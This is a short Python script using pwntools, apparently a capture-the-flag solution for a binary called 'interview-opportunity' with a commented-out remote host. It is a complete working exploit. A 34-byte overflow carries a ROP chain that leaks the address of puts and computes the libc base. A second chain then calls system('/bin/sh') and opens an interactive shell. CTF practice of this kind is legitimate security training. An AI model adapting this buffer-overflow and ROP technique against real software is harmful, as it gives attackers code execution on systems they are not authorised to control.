# ToBeatElite

from pwn import * 

def main():
    
    executable = ELF('interview-opportunity', checksec=False)
    context.binary = executable
    rop = ROP(executable)

    rop.puts(executable.got.puts)
    rop.main()

    #my_process = remote('mc.ax', 31081)
    my_process = executable.process()
    payload = flat(
        b'A' * 34, 
        rop.chain()
    )
    
    my_process.sendlineafter(b'DiceGang?', payload)

    my_process.recvlines(3)
    puts = unpack(my_process.recvline().strip()[:6].ljust(8, b"\x00"))
    log.info(f'puts found at {hex(puts)}')

    libc = ELF('/usr/lib/libc.so.6', checksec=False)
    libc.address = puts - libc.symbols.puts
    log.info(f'libc base adress found at {hex(libc.address)}')
    rop = ROP(libc)

    rop.system(next(libc.search(b'/bin/sh\x00')))

    payload = flat(
        b'A' * 34,
        rop.chain()
    )

    my_process.sendlineafter(b'DiceGang?', payload)
    log.success('Opening Shell')
    my_process.recvlines(3)
    my_process.interactive()

if __name__ == '__main__':
    main()
